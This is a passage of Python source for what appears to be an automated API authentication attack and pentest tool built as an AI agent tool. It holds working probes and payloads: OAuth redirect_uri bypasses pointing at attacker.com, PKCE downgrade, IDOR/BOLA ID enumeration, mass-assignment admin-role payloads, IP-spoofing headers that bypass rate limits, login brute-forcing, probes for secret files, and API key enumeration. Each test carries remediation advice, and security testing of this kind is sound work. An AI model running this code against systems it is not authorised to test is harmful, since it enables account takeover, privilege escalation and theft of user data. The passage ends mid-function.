                else:
                    finding.evidence.append(
                        f"OAuth path {path}: HTTP {resp.status_code}"
                    )
        except Exception:
            pass

    return finding


def test_oauth_redirect_uri(
    target: str,
    headers: dict[str, str],
    timeout: int = 8,
) -> AuthFinding:
    """
    Test OAuth redirect_uri validation bypass.
    """
    finding = AuthFinding(
        test_name="OAuth redirect_uri Validation Bypass",
        category="oauth",
        severity="critical",
        description=(
            "OAuth redirect_uri not strictly validated. "
            "Allows stealing authorization codes / tokens."
        ),
        remediation=[
            "Use exact-match validation for redirect_uri",
            "Register allowed redirect URIs explicitly",
            "Never use wildcard or substring matching",
        ],
        cvss="9.3",
    )

    auth_paths = ["/oauth/authorize", "/oauth2/authorize", "/authorize"]
    domain = re.sub(r"https?://", "", target).split("/")[0]

    bypass_uris = [
        f"https://attacker.com",
        f"https://attacker.com/callback",
        f"https://{domain}.attacker.com/callback",    # post-domain
        f"https://attacker.com/{domain}/callback",    # domain in path
        f"https://{domain}%40attacker.com/callback",  # @ confusion
        f"https://{domain}\\attacker.com/callback",   # backslash
        f"https://{domain}#attacker.com",             # fragment
    ]

    for path in auth_paths:
        for uri in bypass_uris[:3]:   # cap
            url = (
                target.rstrip("/") + path
                + f"?response_type=code&client_id=test"
                + f"&redirect_uri={uri}&state=teststate"
            )
            try:
                resp = requests.get(url, headers=headers,
                                    timeout=timeout, verify=False,
                                    allow_redirects=False)
                loc = resp.headers.get("location", "")
                if "attacker.com" in loc or "code=" in loc:
                    finding.vulnerable = True
                    finding.evidence.append(
                        f"redirect_uri bypass: {uri[:50]} → "
                        f"redirected to {loc[:80]}"
                    )
                elif resp.status_code not in (404,):
                    finding.evidence.append(
                        f"redirect_uri '{uri[:40]}': HTTP {resp.status_code}"
                    )
            except Exception:
                pass

    return finding


def test_oauth_pkce_bypass(
    target: str,
    headers: dict[str, str],
    timeout: int = 8,
) -> AuthFinding:
    """
    Test PKCE downgrade — can we exchange code without code_verifier?
    """
    finding = AuthFinding(
        test_name="OAuth PKCE Downgrade",
        category="oauth",
        severity="high",
        description=(
            "OAuth token endpoint accepts authorization codes "
            "without code_verifier (PKCE bypass). "
            "Allows code interception attacks."
        ),
        remediation=[
            "Enforce PKCE for all public clients",
            "Reject token requests missing code_verifier when PKCE was initiated",
            "Use S256 method only (not plain)",
        ],
        cvss="7.4",
    )

    token_paths = ["/oauth/token", "/oauth2/token", "/token", "/auth/token"]

    for path in token_paths:
        url = target.rstrip("/") + path
        # Attempt token exchange without code_verifier
        payload = {
            "grant_type":    "authorization_code",
            "code":          "stolen_auth_code",
            "redirect_uri":  target + "/callback",
            "client_id":     "test_client",
        }
        try:
            resp = requests.post(url, data=payload, headers=headers,
                                 timeout=timeout, verify=False)
            if resp.status_code not in (404,):
                finding.evidence.append(
                    f"Token endpoint {path} exists: HTTP {resp.status_code}"
                )
                body = resp.text.lower()
                if "access_token" in body or "token_type" in body:
                    finding.vulnerable = True
                    finding.evidence.append(
                        "Token endpoint returned token without code_verifier!"
                    )
                elif "invalid_client" in body or "invalid_grant" in body:
                    finding.evidence.append(
                        "Token endpoint correctly rejected invalid code ✓"
                    )
                elif "code_verifier" in body:
                    finding.evidence.append(
                        "PKCE enforced — code_verifier required ✓"
                    )
        except Exception:
            pass

    return finding


# ══════════════════════════════════════════════════════════════
# 6. IDOR / BOLA TESTS
# ══════════════════════════════════════════════════════════════

def test_idor(
    endpoint_template: str,
    own_token: Optional[str],
    test_ids: list[Any],
    headers: dict[str, str],
    methods: list[str] = ["GET"],
    timeout: int = 8,
) -> list[IDORResult]:
    """
    Test IDOR (Insecure Direct Object Reference) / BOLA.
    Replace ID in endpoint with other user IDs and check access.

    endpoint_template: e.g. "https://api.example.com/api/users/{id}/profile"
    """
    results: list[IDORResult] = []

    # Default IDs to try if none provided
    if not test_ids:
        test_ids = [
            1, 2, 3, 4, 5, 10, 100, 999, 1000,
            "admin", "root", "me", "self",
            "00000000-0000-0000-0000-000000000001",
            "00000000-0000-0000-0000-000000000002",
        ]

    auth_headers = {**headers}
    if own_token:
        auth_headers["Authorization"] = f"Bearer {own_token}"

    for test_id in test_ids[:20]:   # cap
        url = re.sub(r"\{id\}|\{user_id\}|\{userId\}",
                     str(test_id), endpoint_template)
        if url == endpoint_template:
            # No placeholder found — append ID
            url = endpoint_template.rstrip("/") + f"/{test_id}"

        for method in methods:
            idor = IDORResult(
                endpoint=url,
                method=method,
                tested_id=test_id,
            )
            try:
                resp = requests.request(
                    method, url,
                    headers=auth_headers,
                    timeout=timeout,
                    verify=False,
                )
                idor.status_code       = resp.status_code
                idor.response_snippet  = resp.text[:200]

                if resp.status_code in (200, 201, 204):
                    idor.accessible = True
                    idor.severity   = "high"
                    idor.evidence.append(
                        f"IDOR: Accessed resource ID={test_id} → "
                        f"HTTP {resp.status_code}"
                    )
                    # Check for data in response
                    body_lower = resp.text.lower()
                    if any(kw in body_lower for kw in
                           ["email", "phone", "address", "password",
                            "token", "secret", "ssn", "credit"]):
                        idor.severity = "critical"
                        idor.evidence.append(
                            "Response contains sensitive PII data"
                        )
                elif resp.status_code == 403:
                    idor.evidence.append(
                        f"ID={test_id} correctly denied: HTTP 403 ✓"
                    )
                elif resp.status_code == 404:
                    idor.evidence.append(f"ID={test_id}: HTTP 404")

            except Exception as e:
                idor.evidence.append(f"Request failed: {e}")

            results.append(idor)

    return results


def test_bola_horizontal(
    base_url: str,
    token: Optional[str],
    headers: dict[str, str],
    timeout: int = 8,
) -> AuthFinding:
    """
    BOLA (Broken Object Level Authorization) horizontal privilege test.
    Try accessing common user-specific endpoints with different IDs.
    """
    finding = AuthFinding(
        test_name="BOLA / Horizontal IDOR",
        category="bola",
        severity="high",
        description=(
            "Broken Object Level Authorization: API endpoints allow "
            "access to other users' objects without proper authorization check."
        ),
        remediation=[
            "Validate that authenticated user owns the requested resource",
            "Use indirect references (GUIDs) instead of sequential IDs",
            "Implement resource-level access control on every endpoint",
            "Log and alert on authorization failures",
        ],
        cvss="8.1",
    )

    auth_headers = {**headers}
    if token:
        auth_headers["Authorization"] = f"Bearer {token}"

    # Common BOLA-prone endpoint patterns
    user_endpoints = [
        "/api/users/{id}",
        "/api/users/{id}/profile",
        "/api/users/{id}/orders",
        "/api/users/{id}/payments",
        "/api/users/{id}/messages",
        "/api/account/{id}",
        "/api/v1/users/{id}",
        "/api/v2/users/{id}",
        "/user/{id}",
        "/profile/{id}",
        "/orders/{id}",
    ]

    test_ids = [1, 2, 3, "admin", 9999]

    for ep_tmpl in user_endpoints[:6]:
        for tid in test_ids[:3]:
            url = base_url.rstrip("/") + ep_tmpl.replace("{id}", str(tid))
            try:
                resp = requests.get(url, headers=auth_headers,
                                    timeout=timeout, verify=False)
                if resp.status_code in (200, 201):
                    finding.vulnerable = True
                    finding.evidence.append(
                        f"BOLA: {ep_tmpl} ID={tid} → HTTP {resp.status_code} "
                        f"({len(resp.content)} bytes)"
                    )
                    finding.response_snippet = resp.text[:200]
                elif resp.status_code in (401, 403):
                    finding.evidence.append(
                        f"{ep_tmpl} ID={tid}: correctly denied ✓"
                    )
            except Exception:
                pass

    return finding


def test_mass_assignment(
    base_url: str,
    token: Optional[str],
    headers: dict[str, str],
    timeout: int = 8,
) -> AuthFinding:
    """
    Test mass assignment / parameter pollution.
    Try to inject admin/role fields in POST/PUT requests.
    """
    finding = AuthFinding(
        test_name="Mass Assignment / Parameter Pollution",
        category="broken_auth",
        severity="high",
        description=(
            "API accepts privileged fields in user-controlled request body. "
            "Allows users to set admin=true, role=admin, etc."
        ),
        remediation=[
            "Implement strict input validation / allowlisting of accepted fields",
            "Never bind request body directly to data models",
            "Use DTOs with explicit field mapping",
            "Strip privileged fields before processing user input",
        ],
        cvss="8.8",
    )

    auth_headers = {
        **headers,
        "Content-Type": "application/json",
    }
    if token:
        auth_headers["Authorization"] = f"Bearer {token}"

    update_endpoints = [
        "/api/users/me",
        "/api/profile",
        "/api/account",
        "/api/v1/users/me",
        "/api/v1/profile",
        "/user/update",
        "/profile/update",
    ]

    mass_assign_payloads = [
        {"admin": True, "role": "admin",
         "is_superuser": True, "email": "test@test.com"},
        {"user_type": "admin", "permissions": ["admin", "read", "write"],
         "email": "test@test.com"},
        {"is_admin": True, "scope": "admin:all",
         "email": "test@test.com"},
        {"role_id": 1, "group": "administrators",
         "email": "test@test.com"},
    ]

    for ep in update_endpoints[:4]:
        url = base_url.rstrip("/") + ep
        for payload in mass_assign_payloads[:2]:
            try:
                resp = requests.put(url, json=payload,
                                    headers=auth_headers,
                                    timeout=timeout, verify=False)
                if resp.status_code in (200, 201, 204):
                    body = resp.json() if resp.text else {}
                    if isinstance(body, dict):
                        # Check if admin fields were accepted
                        if any(k in body for k in
                               ("admin", "role", "is_admin", "user_type")):
                            finding.vulnerable = True
                            finding.evidence.append(
                                f"Mass assignment on {ep}: "
                                f"privileged fields in response: "
                                f"{[k for k in payload if k in body]}"
                            )
                        else:
                            finding.evidence.append(
                                f"{ep}: PUT returned 200 but no priv fields reflected"
                            )
                elif resp.status_code in (400, 422):
                    finding.evidence.append(
                        f"{ep}: Fields rejected (HTTP {resp.status_code}) ✓"
                    )
                elif resp.status_code in (401, 403):
                    finding.evidence.append(f"{ep}: Auth required")
                elif resp.status_code == 404:
                    pass
            except Exception:
                pass

    return finding


# ══════════════════════════════════════════════════════════════
# 7. RATE LIMIT TESTS
# ══════════════════════════════════════════════════════════════

RATE_LIMIT_BYPASS_HEADERS = [
    # IP spoofing headers
    {"X-Forwarded-For":     "127.0.0.1"},
    {"X-Real-IP":           "127.0.0.1"},
    {"X-Originating-IP":    "127.0.0.1"},
    {"X-Remote-IP":         "127.0.0.1"},
    {"X-Remote-Addr":       "127.0.0.1"},
    {"X-Client-IP":         "127.0.0.1"},
    {"X-Host":              "127.0.0.1"},
    {"X-Forwarded-Host":    "127.0.0.1"},
    {"Forwarded":           "for=127.0.0.1"},
    {"True-Client-IP":      "127.0.0.1"},
    {"CF-Connecting-IP":    "127.0.0.1"},
    {"X-Cluster-Client-IP": "127.0.0.1"},
]


def test_rate_limiting(
    endpoint: str,
    headers: dict[str, str],
    request_count: int = 50,
    timeout: int = 5,
) -> RateLimitResult:
    """
    Test rate limiting:
    1. Send N requests rapidly
    2. Detect when/if throttling kicks in
    3. Try bypass techniques (IP header spoofing)
    """
    result = RateLimitResult(endpoint=endpoint)

    # ── Phase 1: Baseline rate limit detection ──
    blocked_at   = None
    status_codes = []

    for i in range(request_count):
        try:
            resp = requests.get(
                endpoint,
                headers={**headers, "User-Agent": "APIAuthTester/1.0"},
                timeout=timeout,
                verify=False,
            )
            status_codes.append(resp.status_code)
            result.requests_sent += 1

            # Collect rate limit headers
            for hdr in ("X-RateLimit-Limit", "X-RateLimit-Remaining",
                        "X-RateLimit-Reset", "Retry-After",
                        "RateLimit-Limit", "RateLimit-Remaining",
                        "X-Rate-Limit-Limit", "X-Rate-Limit-Remaining"):
                val = resp.headers.get(hdr)
                if val:
                    result.rate_limit_headers[hdr] = val

            if resp.status_code == 429:
                if blocked_at is None:
                    blocked_at = i + 1
                    result.blocked_at = blocked_at

        except requests.exceptions.ConnectionError:
            # Connection refused = possibly rate limited at TCP level
            if blocked_at is None:
                blocked_at = i + 1
                result.blocked_at = blocked_at
            break
        except Exception:
            break

    result.status_codes = status_codes

    if blocked_at is None:
        result.vulnerable = True
        result.evidence.append(
            f"No rate limiting detected after {request_count} requests"
        )
    else:
        result.evidence.append(
            f"Rate limited at request #{blocked_at}"
        )

    # ── Phase 2: Bypass attempts ──
    if not result.vulnerable and blocked_at:
        for bypass_hdr in RATE_LIMIT_BYPASS_HEADERS:
            try:
                test_hdrs = {**headers, **bypass_hdr}
                resp = requests.get(endpoint, headers=test_hdrs,
                                    timeout=timeout, verify=False)
                if resp.status_code != 429:
                    result.bypass_successful = True
                    result.bypass_technique  = str(bypass_hdr)
                    result.vulnerable        = True
                    result.evidence.append(
                        f"Rate limit bypassed with header: {bypass_hdr}"
                    )
                    break
            except Exception:
                pass

    if not result.rate_limit_headers:
        result.evidence.append(
            "No rate limit headers present (X-RateLimit-*, Retry-After)"
        )

    return result


def test_brute_force_protection(
    base_url: str,
    headers: dict[str, str],
    timeout: int = 8,
) -> AuthFinding:
    """
    Test if login endpoint is protected against brute-force.
    """
    finding = AuthFinding(
        test_name="Brute-Force Protection on Login",
        category="rate_limit",
        severity="high",
        description=(
            "Login endpoint lacks brute-force protection. "
            "Attacker can enumerate passwords without throttling."
        ),
        remediation=[
            "Implement account lockout after N failed attempts",
            "Add CAPTCHA after failed attempts",
            "Use exponential backoff / delay",
            "Alert on suspicious login patterns",
            "Implement IP-based rate limiting on auth endpoints",
        ],
        cvss="7.5",
    )

    login_paths = [
        "/api/auth/login",
        "/api/login",
        "/auth/login",
        "/login",
        "/api/token",
        "/oauth/token",
        "/api/auth/token",
        "/api/v1/auth/login",
    ]

    wrong_creds = {
        "username": "admin",
        "password": "wrong_password_test_12345",
    }

    for path in login_paths:
        url = base_url.rstrip("/") + path
        attempt_statuses = []

        for i in range(10):   # 10 rapid wrong attempts
            try:
                resp = requests.post(
                    url,
                    json=wrong_creds,
                    headers={**headers, "Content-Type": "application/json"},
                    timeout=timeout,
                    verify=False,
                )
                attempt_statuses.append(resp.status_code)
                if resp.status_code == 429:
                    finding.evidence.append(
                        f"{path}: Rate limited at attempt #{i+1} ✓"
                    )
                    break
                if resp.status_code == 404:
                    break
            except Exception:
                break

        if attempt_statuses and 429 not in attempt_statuses:
            if any(c in attempt_statuses for c in (200, 400, 401, 403)):
                finding.vulnerable = True
                finding.evidence.append(
                    f"{path}: {len(attempt_statuses)} attempts, "
                    f"no rate limiting detected. "
                    f"Status codes: {set(attempt_statuses)}"
                )

    return finding


# ══════════════════════════════════════════════════════════════
# 8. API KEY TESTS
# ══════════════════════════════════════════════════════════════

def test_api_key_in_responses(
    base_url: str,
    headers: dict[str, str],
    endpoints: list[str],
    timeout: int = 8,
) -> list[APIKeyLeak]:
    """
    Probe endpoints and scan responses for leaked API keys.
    """
    leaks: list[APIKeyLeak] = []
    probe_paths = endpoints or [
        "/api/config", "/api/settings", "/api/env",
        "/api/v1/config", "/actuator/env", "/actuator/configprops",
        "/api/debug", "/debug", "/.env",
        "/api/keys", "/api/secrets", "/api/credentials",
        "/api/admin/config", "/api/internal/config",
    ]

    for path in probe_paths:
        url = base_url.rstrip("/") + (path if path.startswith("/") else "/" + path)
        try:
            resp = requests.get(
                url,
                headers={**headers, "User-Agent": "APIAuthTester/1.0"},
                timeout=timeout,
                verify=False,
            )
            if resp.status_code in (200, 201):
                # Scan response body
                body_leaks = scan_for_api_keys(resp.text, "response_body", url)
                leaks.extend(body_leaks)

                # Scan response headers
                header_str = "\n".join(
                    f"{k}: {v}" for k, v in resp.headers.items()
                )
                hdr_leaks = scan_for_api_keys(header_str, "response_header", url)
                leaks.extend(hdr_leaks)

        except Exception:
            pass

    return leaks


def test_api_key_exposure_in_js(
    base_url: str,
    headers: dict[str, str],
    timeout: int = 8,
) -> list[APIKeyLeak]:
    """
    Fetch JavaScript files and scan for hardcoded API keys.
    """
    leaks: list[APIKeyLeak] = []

    # Fetch main page and find JS files
    try:
        resp = requests.get(
            base_url, headers=headers, timeout=timeout, verify=False
        )
        js_files = re.findall(
            r'src=["\']([^"\']+\.js[^"\']*)["\']',
            resp.text, re.IGNORECASE
        )
        # Also look for inline script content
        inline_scripts = re.findall(
            r'<script[^>]*>(.*?)</script>',
            resp.text, re.DOTALL | re.IGNORECASE
        )
        for script in inline_scripts[:5]:
            script_leaks = scan_for_api_keys(
                script, "inline_script", base_url
            )
            leaks.extend(script_leaks)

    except Exception:
        return leaks

    # Fetch discovered JS files
    for js_path in js_files[:15]:
        js_url = js_path if js_path.startswith("http") else \
            base_url.rstrip("/") + "/" + js_path.lstrip("/")
        try:
            js_resp = requests.get(
                js_url, headers=headers, timeout=timeout, verify=False
            )
            if js_resp.status_code == 200:
                js_leaks = scan_for_api_keys(
                    js_resp.text, "javascript_file", js_url
                )
                leaks.extend(js_leaks)
        except Exception:
            pass

    return leaks


def test_api_key_acceptance(
    base_url: str,
    api_key: str,
    headers: dict[str, str],
    timeout: int = 8,
) -> AuthFinding:
    """
    Test if an API key works across multiple transmission methods.
    Also test: key rotation, key enumeration.
    """
    finding = AuthFinding(
        test_name="API Key Security",
        category="api_key",
        severity="medium",
        description="Test API key transmission, rotation, and enumeration vulnerabilities.",
        remediation=[
            "Rotate API keys regularly",
            "Use short-lived API keys",
            "Implement key scoping (read-only keys)",
            "Never accept API keys in URL query parameters",
            "Log and alert on suspicious key usage",
        ],
    )

    probe_url = base_url.rstrip("/") + "/api/v1/me"

    # Test 1: Key in URL param (insecure)
    for param in ("api_key", "apikey", "key", "token", "access_token"):
        url = f"{probe_url}?{param}={api_key}"
        try:
            resp = requests.get(url, headers=headers,
                                timeout=timeout, verify=False)
            if resp.status_code in (200, 201):
                finding.vulnerable = True
                finding.severity   = "high"
                finding.evidence.append(
                    f"API key accepted in URL query param '{param}' "
                    f"(leaks in logs/history)"
                )
        except Exception:
            pass

    # Test 2: Key in header (correct method)
    for hdr_name in ("X-API-Key", "X-Api-Key", "Api-Key",
                      "Authorization", "X-Auth-Token"):
        hdr_val = f"Bearer {api_key}" if hdr_name == "Authorization" else api_key
        try:
            resp = requests.get(
                probe_url,
                headers={**headers, hdr_name: hdr_val},
                timeout=timeout, verify=False,
            )
            finding.evidence.append(
                f"Key via header '{hdr_name}': HTTP {resp.status_code}"
            )
        except Exception:
            pass

    # Test 3: Key enumeration (try nearby keys)
    if len(api_key) > 8 and api_key[-4:].isdigit():
        # Numeric suffix → try adjacent
        suffix    = int(api_key[-4:])
        prefix    = api_key[:-4]
        for delta in (-1, 1, 2, -2):
            test_key = prefix + str(suffix + delta).zfill(4)
            try:
                resp = requests.get(
                    probe_url,
                    headers={**headers, "X-API-Key": test_key},
                    timeout=timeout, verify=False,
                )
                if resp.status_code in (200, 201):
                    finding.vulnerable = True
                    finding.severity   = "critical"
                    finding.evidence.append(
                        f"API key enumeration: key {test_key[:8]}... accepted!"
                    )
            except Exception:
                pass

    return finding


# ══════════════════════════════════════════════════════════════
# 9. BROKEN AUTH TESTS
# ══════════════════════════════════════════════════════════════

def test_missing_auth_headers(
    base_url: str,
    protected_endpoints: list[str],
    headers: dict[str, str],
    timeout: int = 8,
) -> AuthFinding:
    """
    Test if protected endpoints are accessible without authentication.
    """
    finding = AuthFinding(
        test_name="Missing Authentication on Protected Endpoints",
        category="broken_auth",
        severity="critical",
        description=(
            "API endpoints that should require authentication "
            "are accessible without credentials."
        ),
        remediation=[
            "Enforce authentication middleware on all protected routes",
            "Use a centralized auth layer / API gateway",
            "Test all endpoints for auth bypass in CI/CD",
            "Implement default-deny authorization policy",
        ],
        cvss="9.8",
    )

    # Default sensitive paths to check
    sensitive_paths = protected_endpoints or [
        "/api/admin",
        "/api/admin/users",
        "/api/users",
        "/api/v1/users",
        "/api/user/me",
        "/api/me",
        "/api/profile",
        "/api/settings",
        "/api/config",
        "/api/payments",
        "/api/orders",
        "/api/internal",
        "/api/debug",
        "/actuator",
        "/actuator/env",
        "/actuator/heapdump",
    ]

    # Remove auth from headers for this test
    unauth_headers = {
        k: v for k, v in headers.items()
        if k.lower() not in ("authorization", "x-api-key",
                              "x-auth-token", "cookie")
    }
    unauth_headers["User-Agent"] = "APIAuthTester/1.0"

    for path in sensitive_paths:
        url = base_url.rstrip("/") + path
        try:
            resp = requests.get(url, headers=unauth_headers,
                                timeout=timeout, verify=False)
            if resp.status_code in (200, 201, 204):
                finding.vulnerable = True
                finding.evidence.append(
                    f"UNAUTH ACCESS: {path} → HTTP {resp.status_code} "
                    f"({len(resp.content)} bytes)"
                )
                body_lower = resp.text.lower()
                if any(kw in body_lower for kw in
                       ["email", "password", "token", "secret",
                        "admin", "user", "config"]):
                    finding.severity = "critical"
                    finding.evidence.append(
                        f"  → Response contains sensitive data keywords"
                    )
            elif resp.status_code in (401, 403):
                finding.evidence.append(f"{path}: Auth enforced ✓")
            elif resp.status_code == 404:
                pass    # endpoint doesn't exist
        except Exception:
            pass

    return finding


def test_http_method_bypass(
    endpoint: str,
    headers: dict[str, str],
    timeout: int = 8,
) -> AuthFinding:
    """
    Test HTTP method override bypass.
    Some endpoints check method but accept X-HTTP-Method-Override.
    """
    finding = AuthFinding(
        test_name="HTTP Method Override Bypass",
        category="broken_auth",
        severity="medium",
        description=(
            "Endpoint uses X-HTTP-Method-Override or _method parameter "
            "without proper authorization checks. "
            "Bypasses method-level access control."
        ),
        remediation=[
            "Validate the original HTTP method, not override headers",
            "Disable method override if not required",
            "Apply authorization checks based on intended action, not HTTP method",
        ],
        cvss="6.5",
    )

    # Try method override headers
    override_methods = ["PUT", "DELETE", "PATCH", "POST"]
    override_headers = [
        "X-HTTP-Method-Override",
        "X-Method-Override",
        "X-HTTP-Method",
        "_method",
    ]

    for method in override_methods[:2]:
        for override_hdr in override_headers:
            test_hdrs = {
                **headers,
                override_hdr: method,
                "User-Agent": "APIAuthTester/1.0",
            }
            try:
                resp = requests.get(endpoint, headers=test_hdrs,
                                    timeout=timeout, verify=False)
                # If response differs from plain GET, override may be active
                plain_resp = requests.get(endpoint, headers=headers,
                                          timeout=timeout, verify=False)
                if resp.status_code != plain_resp.status_code:
                    finding.vulnerable = True
                    finding.evidence.append(
                        f"Method override via '{override_hdr}: {method}' "
                        f"changed response: "
                        f"GET={plain_resp.status_code} → "
                        f"Override={resp.status_code}"
                    )
                else:
                    finding.evidence.append(
                        f"Override '{override_hdr}: {method}': "
                        f"no effect ✓"
                    )
            except Exception:
                pass

    return finding


def test_token_in_url(
    base_url: str,
    token: Optional[str],
    headers: dict[str, str],
    timeout: int = 8,
) -> AuthFinding:
    """
    Check if application sends tokens in URL parameters.
    """
    finding = AuthFinding(
        test_name="Token Transmitted in URL",
        category="broken_auth",
        severity="medium",
        description=(
            "Authentication token found in URL query parameters. "
            "Tokens leak in server logs, browser history, and Referrer headers."
        ),
        remediation=[
            "Use Authorization header for token transmission",
            "Never put tokens in URLs",
            "Audit all redirect URLs for token leakage",
        ],
        cvss="6.1",
    )

    # Check if any redirects contain tokens in URL
    try:
        resp = requests.get(
            base_url,
            headers=headers,
            timeout=timeout,
            verify=False,
            allow_redirects=True,
        )
        # Check final URL
        final_url = resp.url
        token_params = ["token", "access_token", "auth_token",
                        "jwt", "bearer", "api_key", "apikey"]
        for param in token_params:
            if f"{param}=" in final_url.lower():
                finding.vulnerable = True
                finding.evidence.append(
                    f"Token parameter '{param}' found in URL: "
                    f"{final_url[:100]}"
                )

        # Check all redirect history
        for r in resp.history:
            loc = r.headers.get("location", "")
            for param in token_params:
                if f"{param}=" in loc.lower():
                    finding.vulnerable = True
                    finding.evidence.append(
                        f"Token in redirect Location header: {loc[:100]}"
                    )

    except Exception:
        pass

    return finding


# ══════════════════════════════════════════════════════════════
# 10. PARSERS
# ══════════════════════════════════════════════════════════════

def parse_jwt_tool(stdout: str, stderr: str) -> list[AuthFinding]:
    """
    Parse jwt_tool output.
    jwt_tool outputs results like:
      [+] Claim Modified - New token: eyJ...
      [!] Algorithm confusion attack: VULNERABLE
      [-] Not vulnerable to ...
    """
    findings: list[AuthFinding] = []
    raw = stdout + "\n" + stderr

    vuln_patterns = [
        (r"\[!\]\s*(.+vulnerable.+)",      "critical"),
        (r"\[\+\]\s*(Algorithm confusion)", "critical"),
        (r"\[\+\]\s*(None algorithm)",      "critical"),
        (r"\[\+\]\s*(Weak secret.+)",       "critical"),
        (r"\[\+\]\s*(kid.+injection)",      "critical"),
        (r"\[\+\]\s*(jku.+)",               "critical"),
        (r"\[\+\]\s*(jwk.+)",               "critical"),
        (r"\[\+\]\s*(Claim.+modified)",     "high"),
        (r"\[\+\]\s*(.+accepted)",          "high"),
        (r"\[-\]\s*Not vulnerable to (.+)", "info"),
    ]

    for line in raw.splitlines():
        line = line.strip()
        if not line:
            continue

        for pattern, severity in vuln_patterns:
            m = re.search(pattern, line, re.IGNORECASE)
            if m:
                vuln = severity not in ("info",)
                findings.append(AuthFinding(
                    test_name=f"jwt_tool: {m.group(1)[:60]}",
                    category="jwt",
                    severity=severity,
                    vulnerable=vuln,
                    description=line,
                    evidence=[line],
                    remediation=["See jwt_tool documentation for fix"],
                ))
                break

    return findings


def parse_burp_output(stdout: str, target: str) -> list[AuthFinding]:
    """
    Parse Burp Suite / Caido exported JSON issues.
    Supports Burp XML and JSON report formats.
    """
    findings: list[AuthFinding] = []

    # Try JSON
    try:
        data = json.loads(stdout)
        issues = data.get("issues", data.get("findings", []))
        for issue in issues:
            severity_map = {
                "high":     "high",
                "medium":   "medium",
                "low":      "low",
                "info":     "info",
                "critical": "critical",
            }
            sev  = severity_map.get(
                issue.get("severity", "").lower(), "info"
            )
            name = issue.get("name") or issue.get("issueName", "Unknown")
            url  = issue.get("url") or issue.get("host", target)
            desc = issue.get("issueDetail") or issue.get("description", "")

            findings.append(AuthFinding(
                test_name=f"Burp: {name}",
                category="burp",
                severity=sev,
                vulnerable=sev in ("high", "critical", "medium"),
                description=desc[:300],
                evidence=[f"URL: {url}", f"Issue: {name}"],
                remediation=issue.get("remediationDetail", "").split("\n")[:3],
            ))
    except json.JSONDecodeError:
        pass

    # Try XML (Burp report format)
    if not findings:
        try:
            import xml.etree.ElementTree as ET
            root = ET.fromstring(stdout)
            for issue in root.findall(".//issue"):
                name     = issue.findtext("name", "Unknown")
                severity = issue.findtext("severity", "info").lower()
                detail   = issue.findtext("issueDetail", "")
                findings.append(AuthFinding(
                    test_name=f"Burp: {name}",
                    category="burp",
                    severity=severity,
                    vulnerable=severity in ("high", "critical", "medium"),
                    description=detail[:300],
                    evidence=[f"Burp finding: {name}"],
                ))
        except Exception:
            pass

    return findings


# ══════════════════════════════════════════════════════════════
# 11. EXECUTOR
# ══════════════════════════════════════════════════════════════

def safe_execute(cmd: list[str], timeout: int = 600) -> tuple[str, str, int]:
    """Run subprocess safely — no shell, no injection."""
    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout,
            shell=False,
        )
        return result.stdout, result.stderr, result.returncode
    except subprocess.TimeoutExpired:
        return "", f"Timed out after {timeout}s", -1
    except FileNotFoundError:
        return "", f"Tool '{cmd[0]}' not installed", -1
    except Exception as e:
        return "", str(e), -1


# ══════════════════════════════════════════════════════════════
# 12. MAIN TOOL FUNCTION
# ══════════════════════════════════════════════════════════════

def api_auth_test(
    tool:        str,
    target:      str,
    args:        list[str] = [],
    token:       Optional[str] = None,
    api_key:     Optional[str] = None,
    endpoints:   list[str] = [],
    headers:     dict[str, str] = {},
    wordlist:    Optional[str] = None,
    user_ids:    list[Any] = [],
    credentials: dict[str, str] = {},
) -> dict:
    """
    🔧 Agent Tool: API Authentication & Authorization Tester

    Capabilities:
      ┌───────────────────────────────────────────────────────────────────┐
      │  JWT ATTACKS          none algorithm, RS256→HS256 confusion,      │
      │                       weak secret brute-force, expiry bypass,     │
      │                       kid SQL/path injection, jku/x5u injection,  │
      │                       embedded JWK, claims privilege escalation   │
      │  OAUTH FLAWS          token in URL, missing state (CSRF),         │
      │                       redirect_uri bypass, PKCE downgrade         │
      │  IDOR / BOLA          horizontal object access, sequential IDs,   │
      │                       mass assignment, parameter pollution         │
      │  RATE LIMITING        brute-force detection, IP header bypass,    │
      │                       login endpoint protection                   │
      │  API KEY LEAKS        JS file scan, response body scan,           │
      │                       20+ key patterns, URL param acceptance       │
      │  BROKEN AUTH          missing auth on endpoints, method override, │
      │                       token in URL, unauthenticated access         │
      │  TOOL INTEGRATION     jwt_tool, burp/caido, manual Python         │
      └───────────────────────────────────────────────────────────────────┘

    Args:
        tool:        "jwt_tool" | "manual" | "burp"
        target:      Base URL (e.g. "https://api.example.com")
        token:       JWT / Bearer token to test
        api_key:     API key to test
        endpoints:   Specific endpoints (for IDOR / auth bypass tests)
        headers:     Additional request headers
        wordlist:    Wordlist for JWT secret brute-force
        user_ids:    IDs to try for IDOR tests
        credentials: {"username": "...", "password": "..."} for login tests

    Tool args reference:
      jwt_tool:
        Basic:      ["-t", "https://api.example.com/api/user"]
        All tests:  ["-M", "at"]
        Specific:   ["-X", "a"]  (alg confusion)
                    ["-X", "n"]  (none alg)
                    ["-X", "s"]  (sign with secret)
        Crack:      ["-C", "-d", "/wordlists/jwt.txt"]
        Verbose:    ["-v"]

      burp:
        (import Burp/Caido JSON or XML report)
        args ignored — provide report via stdin or file path

      manual:
        (all tests run automatically — no args needed)

    Returns:
        Structured JSON: jwt_info → findings → idor_results →
                         rate_limit → api_key_leaks → severity counts
    """
    start = time.time()

    # ══════════════════════════════
    # VALIDATE
    # ══════════════════════════════
    try:
        req = APIAuthTestRequest(
            tool=tool, target=target, args=args,
            token=token, api_key=api_key, endpoints=endpoints,
            headers=headers, wordlist=wordlist,
            user_ids=user_ids, credentials=credentials,
        )
    except Exception as e:
        return APIAuthTestResult(
            success=False, tool=tool, target=target,
            command="", error=f"Validation: {e}"
        ).model_dump()

    # Normalise target
    if not target.startswith("http"):
        target = f"https://{target}"
    target = target.rstrip("/")

    all_findings:      list[AuthFinding]     = []
    idor_results:      list[IDORResult]      = []
    rate_limit_results: list[RateLimitResult] = []
    api_key_leaks:     list[APIKeyLeak]      = []
    jwt_info:          Optional[JWTInfo]     = None
    command_str:       str = ""
    raw_output:        str = ""
    error_msg:         Optional[str] = None
    techniques_used:   list[str] = []

    # ── Decode token if provided ──
    if req.token:
        jwt_info = jwt_decode(req.token)

    # ── Merge provided headers ──
    base_headers = {**req.headers}
    if req.token:
        base_headers.setdefault("Authorization", f"Bearer {req.token}")
    if req.api_key:
        base_headers.setdefault("X-API-Key", req.api_key)

    # ══════════════════════════════
